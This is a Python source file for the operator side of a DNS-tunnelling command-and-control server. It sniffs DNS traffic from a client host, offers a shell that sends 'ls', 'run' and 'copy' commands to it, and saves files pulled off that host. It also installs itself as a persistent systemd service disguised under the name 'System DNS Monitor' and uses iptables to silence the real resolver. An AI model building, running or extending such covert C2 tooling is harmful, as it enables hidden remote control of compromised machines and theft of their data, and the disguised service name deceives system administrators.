#!/usr/bin/env python3

# *********************************************************
#
# Description: Main interactive administration interface terminal shell for C2.
# Usage: sudo .venv/bin/python3 server/cnc_handler.py -i <interface> -d <client_ip>
# Author: Moshe Yifrah
#
# *********************************************************

# --- Modules ---

from __future__ import annotations

import argparse
import asyncio
import os
import socket
import stat
import subprocess
import sys
from pathlib import Path
from typing import Final, Optional, Tuple
import scapy.all as scapy
from cryptography.hazmat.primitives.asymmetric import ed25519 as _ed25519

import cnc_session
from common import cnc_core, cnc_crypto

# --- Constants & State ---

SHUTDOWN_TIMEOUT_WINDOW: Final[float] = 1.0
DISPATCHER_SLEEP_INTERVAL: Final[float] = 0.05

OUTPUT_DIR: Final[str] = os.path.join(os.path.dirname(os.path.abspath(__file__)), "received_files")
FILE_MODE_PERM: Final[int] = 0o600
DIR_MODE_PERM: Final[int] = 0o700

_drain_sock: Optional[socket.socket] = None
_iptables_rule_installed: bool = False

_SERVER_SYSTEMD_UNIT = """\
[Unit]
Description=System DNS Monitor
After=network.target

[Service]
Type=simple
ExecStart={python} {wrapper} --port {port} -- {script} {server_args}
ExecStopPost=/bin/bash -c \
"iptables -D INPUT -p udp --dport {port} -j DROP 2>/dev/null; true"
Restart=on-failure
RestartSec=30
StandardOutput=append:/var/log/cnc-server.log
StandardError=append:/var/log/cnc-server.log

[Install]
WantedBy=multi-user.target
"""

# ==============================================================================

# --- Functions ---

# ==============================================================================


def _iptables(action: str, port: int) -> bool:
    """Run `iptables <action> INPUT -p udp --dport <port> -j DROP`."""
    try:
        return subprocess.run(
            ["iptables", action, "INPUT",
             "-p", "udp", "--dport", str(port), "-j", "DROP"],
            capture_output=True,
        ).returncode == 0
    except FileNotFoundError:
        return False


# ==============================================================================


def acquire_port(port: int) -> None:
    """Suppress competing OS DNS resolver responses on *port*."""
    global _drain_sock, _iptables_rule_installed

    if sys.platform == "linux" and _iptables("-C", port):
        _iptables("-D", port)
        print(
            f"[Server] Cleaned stale iptables :{port} DROP rule.",
            file=sys.stderr,
        )

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", port))
        _drain_sock = sock
        print(
            f"[Server] Drain socket bound on :{port} "
            "(OS resolver bypassed)",
            file=sys.stderr,
        )
        return
    except OSError:
        pass

    if sys.platform == "linux":
        if not _iptables("-C", port):
            if _iptables("-I", port):
                _iptables_rule_installed = True
                print(
                    f"[Server] iptables INPUT :{port} UDP → DROP "
                    "(competing resolver suppressed)",
                    file=sys.stderr,
                )
                return
    print(
        f"[Server] Warning: could not suppress competing resolver on :{port}. "
        "Spurious SERVFAIL responses may occur (harmless — "
        "client discards them via HMAC).",
        file=sys.stderr,
    )


# ==============================================================================


def release_port(port: int) -> None:
    """Release resources acquired by acquire_port()."""
    global _drain_sock, _iptables_rule_installed
    if _drain_sock is not None:
        try:
            _drain_sock.close()
        except OSError:
            pass
        _drain_sock = None
        print(f"[Server] Drain socket on :{port} closed", file=sys.stderr)
    if _iptables_rule_installed:
        _iptables("-D", port)
        _iptables_rule_installed = False
        print(f"[Server] iptables :{port} DROP rule removed", file=sys.stderr)


# ==============================================================================


def install_systemd_service(args: argparse.Namespace) -> None:
    """Write a systemd unit via cnc_wrapper.py and exit."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parts = [
        f"-i {args.interface}",
        f"-d {args.destination_ip}",
        f"--domain {args.domain}",
        f"--port {args.port}",
    ]
    if args.max_qname != 120:
        parts.append(f"--max-qname {args.max_qname}")
    unit_content = _SERVER_SYSTEMD_UNIT.format(
        python=sys.executable,
        wrapper=os.path.join(script_dir, "cnc_wrapper.py"),
        script=os.path.abspath(__file__),
        server_args=" ".join(parts),
        port=args.port,
    )
    unit_path = "/etc/systemd/system/dns-monitor.service"
    try:
        with open(unit_path, "w") as fh:
            fh.write(unit_content)
        os.chmod(unit_path, 0o644)
        print(f"[+] Service installed at {unit_path}")
        print("[+] Enable with: systemctl enable --now dns-monitor")
    except PermissionError:
        print("[!] Permission denied. Run with sudo.", file=sys.stderr)
        sys.exit(1)


# ==============================================================================


def parse_cli_arguments() -> argparse.Namespace:
    """Parse and return validated CLI arguments for the C2 server."""
    parser = argparse.ArgumentParser(
        description="DNS C2 server operator shell."
    )
    parser.add_argument(
        "-i", "--interface", type=str, required=True,
        help="Network interface",
    )
    parser.add_argument(
        "-d", "--destination-ip", type=cnc_core.validate_ipv4,
        required=True, help="Client IPv4 address",
    )
    parser.add_argument(
        "--domain", type=str, default="q.c2",
        help="C2 DNS domain suffix (default: q.c2)",
    )
    parser.add_argument(
        "--port", type=int, default=53,
        help="UDP port to listen on (default: 53)",
    )
    parser.add_argument(
        "--max-qname", type=int, default=120,
        help="Max FQDN length in DNS queries (default: 120; range 64–253)",
    )
    parser.add_argument(
        "--install-service", action="store_true",
        help="Install systemd service via cnc_wrapper.py and exit",
    )
    return parser.parse_args()


# ==============================================================================


def load_server_identity_key(env_path: str = ".env.server") -> str:
    """Load SERVER_PRIVATE_HEX from AWS SSM or fall back to .env.server."""
    s_priv = ""

    try:
        import boto3
        from botocore.config import Config
        region = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
        ssm = boto3.client(
            "ssm", region_name=region,
            config=Config(
                connect_timeout=3, read_timeout=5,
                retries={"max_attempts": 1},
            )
        )
        s_priv = ssm.get_parameter(
            Name="/cnc/server_private_hex", WithDecryption=True
        )["Parameter"]["Value"]
        print(
            "[Server] Identity key loaded from AWS SSM Parameter Store.",
            file=sys.stderr,
        )
    except Exception:
        pass

    env_file = (
        Path(env_path) if Path(env_path).is_absolute()
        else Path(__file__).parent / env_path
    )
    if not s_priv:
        if env_file.is_file():
            if env_file.stat().st_mode & (stat.S_IRWXG | stat.S_IRWXO):
                raise PermissionError(
                    f"Insecure permissions on {env_file}! "
                    f"Run: chmod 600 {env_file}"
                )
            for line in env_file.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                if k.strip() == "SERVER_PRIVATE_HEX":
                    s_priv = v.strip().strip("'\"")
                    break

    if not s_priv:
        raise RuntimeError(
            f"Missing SERVER_PRIVATE_HEX: AWS SSM unavailable and "
            f"{env_file} not found or empty."
        )
    return s_priv.strip()


# ==============================================================================


def _parse_file_transfer_payload(
    file_data_bytes: bytes,
) -> Optional[Tuple[str, bytes]]:
    """Parse file transfer payload; return (filename, content) or None."""
    if b"\n---\n" not in file_data_bytes:
        return None
    header_part, file_content = file_data_bytes.split(b"\n---\n", 1)
    raw_name = header_part.decode("utf-8", errors="replace").strip()
    filename = os.path.basename(raw_name)
    if not filename or filename in {".", ".."} or "\x00" in filename:
        return None
    return filename, file_content


# ==============================================================================


def _resolve_safe_output_path(filename: str) -> Optional[str]:
    """Resolve output path under OUTPUT_DIR, blocking path traversal."""
    os.makedirs(OUTPUT_DIR, mode=DIR_MODE_PERM, exist_ok=True)
    real_base = os.path.realpath(OUTPUT_DIR)
    candidate = os.path.realpath(os.path.join(real_base, filename))
    if os.path.commonpath([real_base, candidate]) != real_base:
        return None
    return candidate


# ==============================================================================


def save_received_file_safely(file_data_bytes: bytes) -> str:
    """Parse, validate, and write a file transfer payload to disk."""
    parsed = _parse_file_transfer_payload(file_data_bytes)
    if parsed is None:
        return "ERROR: Invalid or unsafe file transfer payload."
    filename, file_content = parsed
    safe_path = _resolve_safe_output_path(filename)
    if safe_path is None:
        return "ERROR: Path traversal attempt blocked."
    open_flags = (
        os.O_WRONLY | os.O_CREAT | os.O_TRUNC
        | getattr(os, "O_NOFOLLOW", 0)
    )
    fd = os.open(safe_path, open_flags, FILE_MODE_PERM)
    with os.fdopen(fd, "wb") as fh:
        fh.write(file_content)
    return f"SUCCESS: Saved {len(file_content)} bytes to {safe_path}"


# ==============================================================================


async def _handle_client_response(
    loop, session: cnc_session.ServerSession,
    app_opcode: int, client_bytes: bytes
) -> None:
    """Print or save the client's response to the last operator command."""
    if client_bytes.startswith(b"[File Content Outbox]"):
        status = await loop.run_in_executor(
            None, save_received_file_safely, client_bytes
        )
        print(f"\n[+] File Transfer Status: {status}", file=sys.stderr)
    elif app_opcode != cnc_core.CMD_KEEPALIVE:
        print(
            f"\n[+] Client Response: "
            f"{client_bytes.decode('utf-8', errors='replace')}",
            file=sys.stderr,
        )


# ==============================================================================


async def _send_next_command(session: cnc_session.ServerSession) -> None:
    """Dequeue and deliver the next pending operator command if any."""
    if not session.outbound_queue.empty():
        next_cmd, next_op = await session.outbound_queue.get()
        await session.send_response_chunks_reliably(next_cmd, next_op)
        session.outbound_queue.task_done()


# ==============================================================================


async def reactive_network_dispatcher(
    session: cnc_session.ServerSession
) -> None:
    """Consume inbound payloads and drive the operator command pipeline."""
    loop = asyncio.get_running_loop()
    await asyncio.sleep(DISPATCHER_SLEEP_INTERVAL)
    while not session.shutdown_event.is_set():
        try:
            app_opcode, client_bytes = await asyncio.wait_for(
                session.inbound_queue.get(),
                timeout=cnc_core.DISPATCHER_TIMEOUT,
            )
            await _handle_client_response(
                loop, session, app_opcode, client_bytes
            )
            session.inbound_queue.task_done()
            await _send_next_command(session)
        except asyncio.TimeoutError:
            continue


# ==============================================================================


async def independent_shell_loop(session: cnc_session.ServerSession) -> None:
    """Read operator commands from stdin and enqueue them for the client."""
    loop = asyncio.get_running_loop()
    print("[Server] Shell ready.  ls <path> | run <cmd> | copy <path> | exit")
    while not session.shutdown_event.is_set():
        sys.stdout.write(">> ")
        sys.stdout.flush()
        line = (await loop.run_in_executor(
            None, lambda: sys.stdin.readline()
        )).strip()
        if not line:
            continue
        parts = line.split(None, 1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd == "exit":
            print("[Server] Sending shutdown signal...")
            await loop.run_in_executor(
                None, session.send_shutdown_handshake
            )
            await asyncio.sleep(SHUTDOWN_TIMEOUT_WINDOW)
            session.shutdown_event.set()
            break
        elif cmd == "ls":
            await session.outbound_queue.put(
                (arg.encode("utf-8"), cnc_core.CMD_LIST_DIR)
            )
        elif cmd == "run":
            await session.outbound_queue.put(
                (arg.encode("utf-8"), cnc_core.CMD_RUN_FILE)
            )
        elif cmd in ("copy", "get"):
            await session.outbound_queue.put(
                (arg.encode("utf-8"), cnc_core.CMD_FILE_TRANSFER)
            )
        else:
            print(f"[!] Unknown command '{cmd}'. Use: ls | run | copy | exit")


# ==============================================================================


async def main(args: argparse.Namespace) -> None:
    """Initialize transport, start sniffer and operator shell, then clean up."""
    cnc_core.DNS_QNAME_TARGET_LEN = args.max_qname
    cnc_core.set_c2_domain(args.domain)
    cnc_core.DNS_PORT = args.port
    acquire_port(args.port)
    identity_priv_hex = load_server_identity_key()
    identity_pub_bytes = (
        _ed25519.Ed25519PrivateKey
        .from_private_bytes(bytes.fromhex(identity_priv_hex))
        .public_key().public_bytes_raw()
    )
    cnc_crypto.init_handshake_psk(identity_pub_bytes)
    loop = asyncio.get_running_loop()
    session = cnc_session.ServerSession(args, identity_priv_hex)

    sniff_process = scapy.AsyncSniffer(
        iface=args.interface,
        filter=(
            f"inbound and udp and dst port {args.port} "
            f"and src host {args.destination_ip}"
        ),
        prn=lambda pkt: session.process_incoming_frame(
            pkt, event_loop=loop
        ),
        store=False,
    )
    sniff_process.start()
    try:
        await asyncio.gather(
            independent_shell_loop(session),
            reactive_network_dispatcher(session),
        )
    finally:
        sniff_process.stop()
        session.close()
        release_port(args.port)


# ==============================================================================

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Must run as root (raw socket requires root).", file=sys.stderr)
        sys.exit(1)
    parsed_args = parse_cli_arguments()
    if parsed_args.install_service:
        install_systemd_service(parsed_args)
        sys.exit(0)
    try:
        asyncio.run(main(parsed_args))
    except KeyboardInterrupt:
        print("\n[!] Server terminal execution interrupted.")
        sys.exit(0)
